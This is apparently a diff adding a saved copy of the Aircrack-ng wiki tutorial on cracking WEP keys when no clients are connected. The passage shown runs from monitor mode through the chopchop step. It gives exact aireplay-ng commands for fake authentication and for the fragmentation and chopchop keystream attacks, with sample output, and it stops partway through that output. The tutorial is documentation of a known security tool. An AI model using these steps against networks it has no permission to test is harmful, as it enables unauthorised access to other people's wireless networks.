@@ -1,0 +1,1099 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" dir="ltr" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  
+  <title>
+    how_to_crack_wep_with_no_clients    [Aircrack-ng]
+  </title>
+
+  <meta name="generator" content="DokuWiki">
+<meta name="robots" content="index,follow">
+<meta name="date" content="2011-08-28T16:08:56+0200">
+<meta name="keywords" content="how_to_crack_wep_with_no_clients">
+<link rel="search" type="application/opensearchdescription+xml" href="http://www.aircrack-ng.org/lib/exe/opensearch.php" title="Aircrack-ng">
+<link rel="start" href="http://www.aircrack-ng.org/">
+<link rel="contents" href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients&amp;do=index" title="Sitemap">
+<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="http://www.aircrack-ng.org/feed.php">
+<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="http://www.aircrack-ng.org/feed.php?mode=list&amp;ns=">
+<link rel="alternate" type="text/html" title="Plain HTML" href="http://www.aircrack-ng.org/doku.php?do=export_xhtml&amp;id=how_to_crack_wep_with_no_clients">
+<link rel="alternate" type="text/plain" title="Wiki Markup" href="http://www.aircrack-ng.org/doku.php?do=export_raw&amp;id=how_to_crack_wep_with_no_clients">
+<link rel="canonical" href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients">
+
+
+
+
+
+
+  <link rel="shortcut icon" href="favicon.ico">
+
+  
+<link rel="stylesheet" type="text/css" href="index.css" media="all">
+</head>
+<body>
+<div class="dokuwiki">
+  
+  <div class="stylehead">
+
+    <div class="header">
+      <div class="pagename">
+        [[<a href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients&amp;do=backlink" title="Backlinks">how_to_crack_wep_with_no_clients</a>]]
+      </div>
+      <div class="logo">
+        <a href="http://www.aircrack-ng.org/doku.php" name="dokuwiki__top" id="dokuwiki__top" accesskey="h" title="[H]">Aircrack-ng</a>      </div>
+
+      <div class="clearer"></div>
+    </div>
+
+    
+    <div class="bar" id="bar__top">
+      <div class="bar-left" id="bar__topleft">
+        <form class="button btn_source" method="post" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="edit" type="hidden"><input name="rev" value="" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Show pagesource" class="button" accesskey="v" title="Show pagesource [V]" type="submit"></div></form>        <form class="button btn_revs" method="get" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="revisions" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Old revisions" class="button" accesskey="o" title="Old revisions [O]" type="submit"></div></form>      </div>
+
+      <div class="bar-right" id="bar__topright">
+        <form class="button btn_recent" method="get" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="recent" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Recent changes" class="button" accesskey="r" title="Recent changes [R]" type="submit"></div></form>        <form action="http://www.aircrack-ng.org/doku.php" accept-charset="utf-8" class="search" id="dw__search" method="get"><div class="no"><input name="do" value="search" type="hidden"><input value="" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" type="text"><input value="Search" class="button" title="Search" type="submit"><div style="display: none;" id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>&nbsp;
+      </div>
+
+      <div class="clearer"></div>
+    </div>
+
+        <div class="breadcrumbs">
+      <span class="bchead">Trace:</span> <span class="bcsep">»</span> <a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack" class="breadcrumbs" title="simple_wep_crack">simple_wep_crack</a> <span class="bcsep">»</span> <span class="curid"><a href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients" class="breadcrumbs" title="how_to_crack_wep_with_no_clients">how_to_crack_wep_with_no_clients</a></span>          </div>
+    
+    
+  </div>
+  
+  <div class="plugin_translation"><span>Translations of this page:</span> <ul>  <li><div class="li"><span class="curid"><a href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients" class="wikilink1" title="how_to_crack_wep_with_no_clients">en</a></span></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=de:how_to_crack_wep_with_no_clients" class="wikilink2" title="de:how_to_crack_wep_with_no_clients" rel="nofollow">de</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=es:how_to_crack_wep_with_no_clients" class="wikilink1" title="es:how_to_crack_wep_with_no_clients">es</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=fr:how_to_crack_wep_with_no_clients" class="wikilink2" title="fr:how_to_crack_wep_with_no_clients" rel="nofollow">fr</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=it:how_to_crack_wep_with_no_clients" class="wikilink2" title="it:how_to_crack_wep_with_no_clients" rel="nofollow">it</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=ja:how_to_crack_wep_with_no_clients" class="wikilink2" title="ja:how_to_crack_wep_with_no_clients" rel="nofollow">ja</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=ko:how_to_crack_wep_with_no_clients" class="wikilink2" title="ko:how_to_crack_wep_with_no_clients" rel="nofollow">ko</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=pl:how_to_crack_wep_with_no_clients" class="wikilink2" title="pl:how_to_crack_wep_with_no_clients" rel="nofollow">pl</a></div></li>  <li><div class="li"><a href="http://www.aircrack-ng.org/doku.php?id=pt-br:how_to_crack_wep_with_no_clients" class="wikilink1" title="pt-br:how_to_crack_wep_with_no_clients">pt-br</a></div></li></ul></div>
+  <div class="page">
+    <!-- wikipage start -->
+    <!-- TOC START -->
+<div class="toc">
+<div style="cursor: pointer;" class="tocheader toctoggle" id="toc__header"><span class="toc_close" style="cursor: pointer;" id="toc__toggle"><span>−</span></span>Table of Contents</div>
+<div id="toc__inside">
+
+<ul class="toc">
+<li class="level1"><div class="li"><span class="li"><a href="#tutorialhow_to_crack_wep_with_no_wireless_clients" class="toc">Tutorial: How to crack WEP with no wireless clients</a></span></div>
+<ul class="toc">
+<li class="level2"><div class="li"><span class="li"><a href="#introduction" class="toc">Introduction</a></span></div></li>
+<li class="level2"><div class="li"><span class="li"><a href="#assumptions" class="toc">Assumptions</a></span></div></li>
+<li class="level2"><div class="li"><span class="li"><a href="#equipment_used" class="toc">Equipment used</a></span></div></li>
+<li class="level2"><div class="li"><span class="li"><a href="#solution" class="toc">Solution</a></span></div>
+<ul class="toc">
+<li class="level3"><div class="li"><span class="li"><a href="#solution_overview" class="toc">Solution Overview</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_1_-_set_the_wireless_card_mac_address" class="toc">Step 1 - Set the wireless card MAC address</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_2_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel" class="toc">Step 2 - Start the wireless interface in monitor mode on AP channel</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_3_-_use_aireplay-ng_to_do_a_fake_authentication_with_the_access_point" class="toc">Step 3 - Use aireplay-ng to do a fake authentication with the access point</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_4_-_use_aireplay-ng_chopchop_or_fragmenation_attack_to_obtain_prga" class="toc">Step 4 - Use aireplay-ng chopchop or fragmenation attack to obtain PRGA</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_5_-_use_packetforge-ng_to_create_an_arp_packet" class="toc">Step 5 - Use packetforge-ng to create an arp packet</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_6_-_start_airodump-ng" class="toc">Step 6 -  Start airodump-ng</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_7_-_inject_the_arp_packet" class="toc">Step 7 - Inject the arp packet</a></span></div></li>
+<li class="level3"><div class="li"><span class="li"><a href="#step_8_-_run_aircrack-ng_to_obtain_the_wep_key" class="toc">Step 8 - Run aircrack-ng to obtain the WEP key</a></span></div></li>
+</ul>
+</li>
+<li class="level2"><div class="li"><span class="li"><a href="#alternate_solution" class="toc">Alternate Solution</a></span></div></li>
+<li class="level2"><div class="li"><span class="li"><a href="#using_another_source_mac_address" class="toc">Using Another Source MAC Address</a></span></div></li></ul>
+</li></ul>
+</div>
+</div>
+<!-- TOC END -->
+
+<h1 class="sectionedit1"><a name="tutorialhow_to_crack_wep_with_no_wireless_clients" id="tutorialhow_to_crack_wep_with_no_wireless_clients">Tutorial: How to crack WEP with no wireless clients</a></h1>
+<div class="level1">
+
+<p>
+Version: 1.16 August 28, 201 <br>
+
+By: darkAudax <br>
+
+Video: <a href="http://video.aircrack-ng.org/noclient/" class="urlextern" title="http://video.aircrack-ng.org/noclient/" rel="nofollow">http://video.aircrack-ng.org/noclient/</a>
+</p>
+
+</div>
+
+<h2 class="sectionedit2"><a name="introduction" id="introduction">Introduction</a></h2>
+<div class="level2">
+
+<p>
+There are many times when a wireless network has no wireless clients associated with it and there are no ARP requests coming from the wired side.  This tutorial describes how to crack the WEP key when there are no wireless clients and there are no ARP requests coming from the wired side.  Although this topic has been discussed many times over in the <a href="http://forum.aircrack-ng.org/" class="urlextern" title="http://forum.aircrack-ng.org" rel="nofollow">Forum</a>, this tutorial is intended to address the topic in more detail and provide working examples.
+</p>
+
+<p>
+If there ARP requests being broadcast from the wire side, then the standard <a href="http://www.aircrack-ng.org/doku.php?id=fake_authentication" class="wikilink1" title="fake_authentication">fake authentication</a> combined with <a href="http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection" class="wikilink1" title="arp-request_reinjection">ARP request replay technique</a> may be used.
+</p>
+
+<p>
+It is recommended that you experiment with your home wireless access point to get familiar with these ideas and techniques. If you do not own a particular access point, please remember to get permission from the owner prior to playing with it.
+</p>
+
+<p>
+I would like to acknowledge and thank the <a href="http://trac.aircrack-ng.org/wiki/Team" class="urlextern" title="http://trac.aircrack-ng.org/wiki/Team" rel="nofollow">Aircrack-ng team</a> for producing such a great robust tool. 
+</p>
+
+<p>
+Please send me any constructive feedback, positive or negative. Additional troubleshooting ideas and tips are especially welcome.
+</p>
+
+</div>
+
+<h2 class="sectionedit3"><a name="assumptions" id="assumptions">Assumptions</a></h2>
+<div class="level2">
+
+<p>
+
+First, this solution assumes:
+</p>
+<ul>
+<li class="level1"><div class="li"> You are using drivers patched for injection. Use the <a href="http://www.aircrack-ng.org/doku.php?id=injection_test" class="wikilink1" title="injection_test">injection test</a> to confirm your card can inject prior to proceeding.</div>
+</li>
+<li class="level1"><div class="li"> You are physically close enough to send and receive access point packets.  Remember that just because you can receive packets from the access point does not mean you may will be able to transmit packets to the AP.  The wireless card strength is typically less then the AP strength.  So you have to be physically close enough for your transmitted packets to reach and be received by the AP.  You should confirm that you can communicate with the specific AP by following <a href="http://www.aircrack-ng.org/doku.php?id=injection_test#hidden_or_specific_ssid" class="wikilink1" title="injection_test">these instructions</a>.</div>
+</li>
+<li class="level1"><div class="li">There are some data packets coming from the access point.  Beacons and other management frame packets are totally useless for our purposes in this tutorial.  A quick way to check is to run airodump-ng and see if there are any data packets counted for the access point.  Having said that, if you have data captured from the access point from another session, then this can be used.  This is an advanced topic and this tutorial does not provide detailed instructions for this case.</div>
+</li>
+<li class="level1"><div class="li"> The access point uses WEP “open authentication”.  It will not work if “shared key authentication” (SKA) is being used.  With SKA, the only way to be successful with no clients present is if you captured the PRGA xor data with a airodump-ng handshake or an aireplay-ng attack previously.  This is because you will need the PRGA xor file to do the fake authentication successfully.</div>
+</li>
+<li class="level1"><div class="li"> You use the native MAC address of your wireless card for all the steps and do not change it.  Do NOT use any other MAC address as the source for transmitting packets.  Otherwise, some commands will not work correctly.  See the <span class="curid"><a href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients#using_another_source_mac_address" class="wikilink1" title="how_to_crack_wep_with_no_clients">Using Another Source MAC Address Section</a></span> for instructions on dealing with using a different source MAC address.</div>
+</li>
+<li class="level1"><div class="li"> You are using v0.9 of aircrack-ng. If you use a different version then some of the command options may have to be changed.</div>
+</li>
+</ul>
+
+<p>
+
+Ensure all of the above assumptions are true, otherwise the advice that follows will not work.  In the examples below, you will need to change “ath0” to the interface name which is specific to your wireless card.
+</p>
+
+</div>
+
+<h2 class="sectionedit4"><a name="equipment_used" id="equipment_used">Equipment used</a></h2>
+<div class="level2">
+
+<p>
+
+In this tutorial, here is what was used:
+
+</p>
+<ul>
+<li class="level1"><div class="li">MAC address of PC running aircrack-ng suite: 00:09:5B:EC:EE:F2</div>
+</li>
+<li class="level1"><div class="li">BSSID (MAC address of access point): 00:14:6C:7E:40:80</div>
+</li>
+<li class="level1"><div class="li">ESSID (Wireless network name): teddy</div>
+</li>
+<li class="level1"><div class="li">Access point channel: 9</div>
+</li>
+<li class="level1"><div class="li">Wireless interface: ath0</div>
+</li>
+</ul>
+
+<p>
+
+You should gather the equivalent information for the network you will be working on.  Then just change the values in the examples below to the specific network.
+</p>
+
+</div>
+
+<h2 class="sectionedit5"><a name="solution" id="solution">Solution</a></h2>
+<div class="level2">
+
+</div>
+
+<h3 class="sectionedit6"><a name="solution_overview" id="solution_overview">Solution Overview</a></h3>
+<div class="level3">
+
+<p>
+
+Here are the basic steps we will be going through:
+
+</p>
+<ul>
+<li class="level1"><div class="li">1 - Set the wireless card MAC address</div>
+</li>
+<li class="level1"><div class="li">2 - Start the wireless interface in monitor mode on the specific AP channel</div>
+</li>
+<li class="level1"><div class="li">3 - Use aireplay-ng to do a fake authentication with the access point</div>
+</li>
+<li class="level1"><div class="li">4 - Use aireplay-ng chopchop or fragmentation attack to obtain PRGA</div>
+</li>
+<li class="level1"><div class="li">5 - Use packetforge-ng to create an arp packet using the PRGA obtain in the previous step</div>
+</li>
+<li class="level1"><div class="li">6 - Start airodump-ng on AP channel with filter for bssid to collect the new unique IVs</div>
+</li>
+<li class="level1"><div class="li">7 - Inject the arp packet created in step 5</div>
+</li>
+<li class="level1"><div class="li">8 - Run aircrack-ng to crack key using the IVs collected</div>
+</li>
+</ul>
+
+</div>
+
+<h3 class="sectionedit7"><a name="step_1_-_set_the_wireless_card_mac_address" id="step_1_-_set_the_wireless_card_mac_address">Step 1 - Set the wireless card MAC address</a></h3>
+<div class="level3">
+
+<p>
+
+To be honest, we will not be changing the wireless card MAC address.
+</p>
+
+<p>
+This is a reminder to use your wireless card MAC address as the source MAC.  I mention this explicitly as a reminder to use the actual MAC address from your card in “Step 3 - fake authentication” if you are replaying data from another session.  Detailed instructions can be found in the <acronym title="Frequently Asked Questions">FAQ</acronym>: <a href="http://www.aircrack-ng.org/doku.php?id=faq#how_do_i_change_my_card_s_mac_address" class="wikilink1" title="faq">How do I change my card's MAC address ?</a>.
+</p>
+
+</div>
+
+<h3 class="sectionedit8"><a name="step_2_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel" id="step_2_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel">Step 2 - Start the wireless interface in monitor mode on AP channel</a></h3>
+<div class="level3">
+
+<p>
+
+Enter the following command to start the wireless card on channel 9 in monitor mode:
+
+</p>
+<pre class="code"> airmon-ng start wifi0 9</pre>
+
+<p>
+
+Note: In this command we use “wifi0” instead of our wireless interface of “ath0”.  This is because the madwifi-ng drivers are being used. For other drivers, use the actual interface name.
+</p>
+
+<p>
+The system will respond:
+
+</p>
+<pre class="code"> Interface       Chipset         Driver
+ 
+ wifi0           Atheros         madwifi-ng
+ ath0            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode enabled)</pre>
+
+<p>
+
+You will notice that “ath0” is reported above as being put into monitor mode.
+</p>
+
+<p>
+To confirm the interface is properly setup, enter “iwconfig”.
+</p>
+
+<p>
+The system will respond:
+
+</p>
+<pre class="code"> lo        no wireless extensions.
+ 
+ eth0      no wireless extensions.
+ 
+ wifi0     no wireless extensions.
+ 
+ ath0      IEEE 802.11g  ESSID:""  Nickname:""
+           Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:09:5B:EC:EE:F2   
+           Bit Rate:0 kb/s   Tx-Power:15 dBm   Sensitivity=0/3  
+           Retry:off   RTS thr:off   Fragment thr:off
+           Encryption key:off
+           Power Management:off
+           Link Quality=0/94  Signal level=-98 dBm  Noise level=-98 dBm
+           Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+           Tx excessive retries:0  Invalid misc:0   Missed beacon:0</pre>
+
+<p>
+
+In the response above, you can see that ath0 is in monitor mode, on the 2.452GHz frequency which is channel 9 and the Access Point shows the MAC address of your wireless card.  So everything is good.   It is important to confirm all this information prior to proceeding, otherwise the following steps will not work properly. (Note: If you are using a driver other than madwifi, then the Access Point field will be either invisible or show something other than your card's MAC address. This is normal.)
+</p>
+
+<p>
+To match the frequency to the channel, check out: <a href="http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132" class="urlextern" title="http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132" rel="nofollow">http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132</a> .  This will give you the frequency for each channel.
+</p>
+
+</div>
+
+<h4><a name="troubleshooting_tips" id="troubleshooting_tips">Troubleshooting Tips</a></h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li">If another interface started other than ath0 then stop all of them first by using “airmon-ng stop athX” where X is each interface you want to stop.</div>
+</li>
+<li class="level1"><div class="li">On mac80211-based drivers, airmon-ng will respond with something like this:</div>
+</li>
+</ul>
+<pre class="code"> Interface       Chipset         Driver
+ 
+ wlan0           Broadcom 43xx   b43 - [phy0]
+                                 (monitor mode enabled on mon0)</pre>
+
+<p>
+
+For such interfaces, use the interface name after “monitor mode enabled on” (here “mon0”) for further commands, rather than your card's actual interface.
+</p>
+
+</div>
+
+<h3 class="sectionedit9"><a name="step_3_-_use_aireplay-ng_to_do_a_fake_authentication_with_the_access_point" id="step_3_-_use_aireplay-ng_to_do_a_fake_authentication_with_the_access_point">Step 3 - Use aireplay-ng to do a fake authentication with the access point</a></h3>
+<div class="level3">
+
+<p>
+
+This is a very important step.
+</p>
+
+<p>
+In order for an access point to accept a packet, the source MAC address must already be associated.  If the source MAC address you are injecting is not associated then the AP ignores the packet and sends out a “DeAuthentication” packet.  In this state, no new IVs are created because the AP is ignoring all the injected packets.
+</p>
+
+<p>
+The lack of association with the access point is the single biggest reason why injection fails.  
+</p>
+
+<p>
+To associate with an access point, use fake authentication:
+
+</p>
+<pre class="code"> aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-1 means fake authentication</div>
+</li>
+<li class="level1"><div class="li">0 reassociation timing in seconds</div>
+</li>
+<li class="level1"><div class="li">-e teddy is the wireless network name</div>
+</li>
+<li class="level1"><div class="li">-a 00:14:6C:7E:40:80 is the access point MAC address</div>
+</li>
+<li class="level1"><div class="li">-h 00:09:5B:EC:EE:F2 is our card MAC address</div>
+</li>
+<li class="level1"><div class="li">ath0 is the wireless interface name</div>
+</li>
+</ul>
+
+<p>
+
+Success looks like:
+</p>
+<pre class="code">18:18:20  Sending Authentication Request
+18:18:20  Authentication successful
+18:18:20  Sending Association Request
+18:18:20  Association successful :-)</pre>
+
+<p>
+
+Or another variation for picky access points:
+
+</p>
+<pre class="code">aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li"> 6000 - Reauthenticate very 6000 seconds.  The long period also causes keep alive packets to be sent.</div>
+</li>
+<li class="level1"><div class="li"> -o 1 - Send only one set of packets at a time.  Default is multiple and this confuses some APs.</div>
+</li>
+<li class="level1"><div class="li"> -q 10 - Send keep alive packets every 10 seconds.</div>
+</li>
+</ul>
+
+<p>
+
+Success looks like:
+</p>
+<pre class="code">18:22:32  Sending Authentication Request
+18:22:32  Authentication successful
+18:22:32  Sending Association Request
+18:22:32  Association successful :-)
+18:22:42  Sending keep-alive packet
+18:22:52  Sending keep-alive packet
+# and so on.</pre>
+
+<p>
+
+Here is an example of what a failed authentication looks like:
+</p>
+<pre class="code">8:28:02  Sending Authentication Request
+18:28:02  Authentication successful
+18:28:02  Sending Association Request
+18:28:02  Association successful :-)
+18:28:02  Got a deauthentication packet!
+18:28:05  Sending Authentication Request
+18:28:05  Authentication successful
+18:28:05  Sending Association Request
+18:28:10  Sending Authentication Request
+18:28:10  Authentication successful
+18:28:10  Sending Association Request</pre>
+
+<p>
+
+Notice the “Got a deauthentication packet” and the continuous retries above.  Do not proceed to the next step until you have the fake authentication running correctly.
+</p>
+
+</div>
+
+<h4><a name="troubleshooting_tips1" id="troubleshooting_tips1">Troubleshooting Tips</a></h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li">Some access points are configured to only allow selected MAC addresses to associate and connect.  If this is the case, you will not be able to successfully do fake authentication unless you know one of the MAC addresses on the allowed list.  See the MAC access control troubleshooting tip <a href="http://www.aircrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase#troubleshooting_tips" class="wikilink1" title="i_am_injecting_but_the_ivs_don_t_increase">here</a>.</div>
+</li>
+<li class="level1"><div class="li">If at any time you wish to confirm you are properly associated is to use tcpdump and look at the packets.  Start another session and…</div>
+</li>
+</ul>
+
+<p>
+
+Run:
+</p>
+<pre class="code"> tcpdump -n -e -s0 -vvv -i ath0</pre>
+
+<p>
+
+Here is a typical tcpdump error message you are looking for:
+
+</p>
+<pre class="code"> 11:04:34.360700 314us BSSID:00:14:6c:7e:40:80 DA:00:09:5B:EC:EE:F2 SA:00:14:6c:7e:40:80   DeAuthentication: Class 3 frame received from nonassociated station</pre>
+
+<p>
+
+Notice that the access point (00:14:6c:7e:40:80) is telling the source (00:09:5B:EC:EE:F2) you are not associated.  Meaning, the AP will not process or accept the injected packets.
+</p>
+
+<p>
+If you want to select only the DeAuth packets with tcpdump then you can use: “tcpdump -n -e -s0 -vvv -i ath0 | grep -i DeAuth”.  You may need to tweak the phrase “DeAuth” to pick out the exact packets you want.
+</p>
+
+</div>
+
+<h3 class="sectionedit10"><a name="step_4_-_use_aireplay-ng_chopchop_or_fragmenation_attack_to_obtain_prga" id="step_4_-_use_aireplay-ng_chopchop_or_fragmenation_attack_to_obtain_prga">Step 4 - Use aireplay-ng chopchop or fragmenation attack to obtain PRGA</a></h3>
+<div class="level3">
+
+<p>
+
+The objective of the <a href="http://www.aircrack-ng.org/doku.php?id=korek_chopchop" class="wikilink1" title="korek_chopchop">chopchop</a> and <a href="http://www.aircrack-ng.org/doku.php?id=fragmentation" class="wikilink1" title="fragmentation">fragmentation</a> attacks is to obtain a PRGA (pseudo random generation algorithm) file. This PRGA is not the WEP key and cannot be used to decrypt packets. However, it can be used to create new packets for injection. The creation of new packets will be covered later in the tutorial.
+</p>
+
+<p>
+Either chopchop or fragmentation attacks can be to obtain the PRGA bit file. The result is the same so use whichever one works for you.  The pros and cons of each attack are described on the <a href="http://www.aircrack-ng.org/doku.php?id=aircrack-ng" class="wikilink1" title="aircrack-ng">aircrack-ng</a> page.
+</p>
+
+<p>
+We will cover the fragmentation technique first.  Start another console session and run:
+
+</p>
+<pre class="code"> aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-5 means the fragmentation attack</div>
+</li>
+<li class="level1"><div class="li">-b 00:14:6C:7E:40:80 is the access point MAC address</div>
+</li>
+<li class="level1"><div class="li">-h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</div>
+</li>
+<li class="level1"><div class="li">ath0 is the wireless interface name</div>
+</li>
+</ul>
+
+<p>
+
+The system will respond:
+
+</p>
+<pre class="code"> aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0                 
+ Waiting for a data packet...
+ Read 127 packets...
+         
+         Size: 114, FromDS: 1, ToDS: 0 (WEP)
+         
+         BSSID  =  00:14:6C:7E:40:80
+         Dest. MAC  =  01:00:5E:00:00:FB
+         Source MAC  =  00:40:F4:77:E5:C9
+         
+         0x0000:  0842 0000 0100 5e00 00fb 0014 6c7e 4080  .B....^.....l~@.
+         0x0010:  0040 f477 e5c9 6052 8c00 0000 3073 d265  .@.w..`R....0s.e
+         0x0020:  c402 790b 2293 c7d5 89c5 4136 7283 29df  ..y.".....A6r.).
+         0x0030:  4e9e 5e13 5f43 4ff5 1b37 3ff9 4da4 c03b  N.^._CO..7?.M..;
+         0x0040:  8244 5882 d5cc 7a1f 2b9b 3ef0 ee0f 4fb5  .DX...z.+.&gt;...O.
+         0x0050:  4563 906d 0d90 88c4 5532 a602 a8ea f8e2  Ec.m....U2......
+         0x0060:  c531 e214 2b28 fc19 b9a8 226d 9c71 6ab1  .1..+(...."m.qj.
+         0x0070:  9c9f                                     ..
+         
+         Use this packet ? y</pre>
+
+<p>
+
+When a packet from the access point arrives, enter “y” to proceed.  You may need to try a few different packets from the AP to be successful.  These packets have ”“FromDS: 1”.
+</p>
+
+<p>
+When successful, the system responds:
+
+</p>
+<pre class="code"> Saving chosen packet in replay_src-0203-180328.cap
+ Data packet found!
+ Sending fragmented packet
+ Got RELAYED packet!!
+ Thats our ARP packet!
+ Trying to get 384 bytes of a keystream
+ Got RELAYED packet!!
+ Thats our ARP packet!
+ Trying to get 1500 bytes of a keystream
+ Got RELAYED packet!!
+ Thats our ARP packet!
+ Saving keystream in fragment-0203-180343.xor
+ Now you can build a packet with packetforge-ng out of that 1500 bytes keystream</pre>
+
+<p>
+
+Success!  The file “fragment-0203-180343.xor” can then be used in the next step to generate an arp packet.
+</p>
+
+<p>
+If the fragmentation attack was not successful, you can then try the chopchop technique next.  Run:
+
+</p>
+<pre class="code"> aireplay-ng -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-4 means the chopchop attack</div>
+</li>
+<li class="level1"><div class="li">-h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</div>
+</li>
+<li class="level1"><div class="li"> -b 00:14:6C:7E:40:80 is the access point MAC address</div>
+</li>
+<li class="level1"><div class="li">ath0 is the wireless interface name</div>
+</li>
+</ul>
+
+<p>
+
+The system responds:
+
+</p>
+<pre class="code">      Read 165 packets...
+
+         Size: 86, FromDS: 1, ToDS: 0 (WEP)
+ 
+         BSSID  =  00:14:6C:7E:40:80
+         Dest. MAC  =  FF:FF:FF:FF:FF:FF
+         Source MAC  =  00:40:F4:77:E5:C9
+ 
+         0x0000:  0842 0000 ffff ffff ffff 0014 6c7e 4080  .B..........l~@.
+         0x0010:  0040 f477 e5c9 603a d600 0000 5fed a222  .@.w..`:...._.."
+         0x0020:  e2ee aa48 8312 f59d c8c0 af5f 3dd8 a543  ...H......._=..C
+         0x0030:  d1ca 0c9b 6aeb fad6 f394 2591 5bf4 2873  ....j.....%.[.(s
+         0x0040:  16d4 43fb aebb 3ea1 7101 729e 65ca 6905  ..C...&gt;.q.r.e.i.
+         0x0050:  cfeb 4a72 be46                           ..Jr.F
+
+ Use this packet ? y</pre>
+
+<p>
+
+You respond “y” above and the system continues.
+
+</p>
+<pre class="code"> Saving chosen packet in replay_src-0201-191639.cap
+ 
+ Offset   85 ( 0% done) | xor = D3 | pt = 95 |  253 frames written in   760ms
+ Offset   84 ( 1% done) | xor = EB | pt = 55 |  166 frames written in   498ms
+ Offset   83 ( 3% done) | xor = 47 | pt = 35 |  215 frames written in   645ms
+ Offset   82 ( 5% done) | xor = 07 | pt = 4D |  161 frames written in   483ms
+ Offset   81 ( 7% done) | xor = EB | pt = 00 |   12 frames written in    36ms
+ Offset   80 ( 9% done) | xor = CF | pt = 00 |  152 frames written in   456ms
+ Offset   79 (11% done) | xor = 05 | pt = 00 |   29 frames written in    87ms
+ Offset   78 (13% done) | xor = 69 | pt = 00 |  151 frames written in   454ms
+ Offset   77 (15% done) | xor = CA | pt = 00 |   24 frames written in    71ms
+ Offset   76 (17% done) | xor = 65 | pt = 00 |  129 frames written in   387ms
+ Offset   75 (19% done) | xor = 9E | pt = 00 |   36 frames written in   108ms
+ Offset   74 (21% done) | xor = 72 | pt = 00 |   39 frames written in   117ms
+ Offset   73 (23% done) | xor = 01 | pt = 00 |  146 frames written in   438ms
+ Offset   72 (25% done) | xor = 71 | pt = 00 |   83 frames written in   249ms
+ Offset   71 (26% done) | xor = A1 | pt = 00 |   43 frames written in   129ms
+ Offset   70 (28% done) | xor = 3E | pt = 00 |   98 frames written in   294ms
+ Offset   69 (30% done) | xor = BB | pt = 00 |  129 frames written in   387ms
+ Offset   68 (32% done) | xor = AE | pt = 00 |  248 frames written in   744ms
+ Offset   67 (34% done) | xor = FB | pt = 00 |  105 frames written in   315ms
+ Offset   66 (36% done) | xor = 43 | pt = 00 |  101 frames written in   303ms
+ Offset   65 (38% done) | xor = D4 | pt = 00 |  158 frames written in   474ms
+ Offset   64 (40% done) | xor = 16 | pt = 00 |  197 frames written in   591ms
+ Offset   63 (42% done) | xor = 7F | pt = 0C |   72 frames written in   217ms
